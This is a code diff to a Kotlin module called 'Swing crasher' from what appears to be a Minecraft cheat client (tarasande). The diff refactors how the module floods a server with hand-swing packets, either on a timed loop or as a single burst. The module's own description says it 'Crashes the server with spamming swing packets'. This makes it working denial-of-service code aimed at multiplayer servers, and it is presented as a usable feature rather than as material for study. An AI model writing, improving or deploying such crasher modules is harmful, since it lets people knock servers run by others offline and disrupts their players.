@@ -9,9 +9,10 @@ import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
 import su.mandora.tarasande.system.feature.modulesystem.Module
 import su.mandora.tarasande.util.math.TimeUtil
 import su.mandora.tarasande.util.string.StringUtil
+import su.mandora.tarasande_crasher.CRASHER
 import su.mandora.tarasande_crasher.forcePacket
 
-class ModuleSwingCrasher : Module("Swing crasher", "Crashes the server with spamming swing packets", "Crasher") {
+class ModuleSwingCrasher : Module("Swing crasher", "Crashes the server with spamming swing packets", CRASHER) {
 
     private val mode = ValueMode(this, "Mode", false, "Player tick", "Only once")
     private val delay = ValueNumber(this, "Delay", 5.0, 50.0, 100.0, 5.0, isEnabled = { mode.isSelected(0) })
@@ -24,19 +25,21 @@ class ModuleSwingCrasher : Module("Swing crasher", "Crashes the server with spam
         registerEvent(EventDisconnect::class.java) {
             switchState()
         }
-        registerEvent(EventUpdate::class.java) {
-            if (mode.isSelected(0)) {
-                if (timer.hasReached(delay.value.toLong())) {
+        registerEvent(EventUpdate::class.java) { event ->
+            if(event.state == EventUpdate.State.PRE) {
+                if (mode.isSelected(0)) {
+                    if (timer.hasReached(delay.value.toLong())) {
+                        repeat(repeat.value.toInt()) {
+                            forcePacket(HandSwingC2SPacket(if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND))
+                        }
+                        timer.reset()
+                    }
+                } else {
                     repeat(repeat.value.toInt()) {
                         forcePacket(HandSwingC2SPacket(if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND))
                     }
-                    timer.reset()
+                    switchState()
                 }
-            } else {
-                repeat(repeat.value.toInt()) {
-                    forcePacket(HandSwingC2SPacket(if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND))
-                }
-                switchState()
             }
         }
     }
